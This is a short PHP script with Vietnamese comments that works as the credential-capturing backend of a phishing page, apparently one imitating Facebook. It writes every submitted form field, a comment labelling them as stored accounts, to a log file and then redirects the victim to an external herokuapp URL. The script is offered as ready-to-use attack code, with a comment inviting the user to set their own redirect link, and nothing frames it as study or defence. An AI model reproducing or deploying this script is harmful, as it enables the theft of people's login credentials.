<?php
header("Location: https://mdtiot.herokuapp.com/fb/ngu.php "); //nhập link các bạn muốn chuyển đến 
$handle = fopen("log.txt", "a");//nơi lưu tài khoản
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>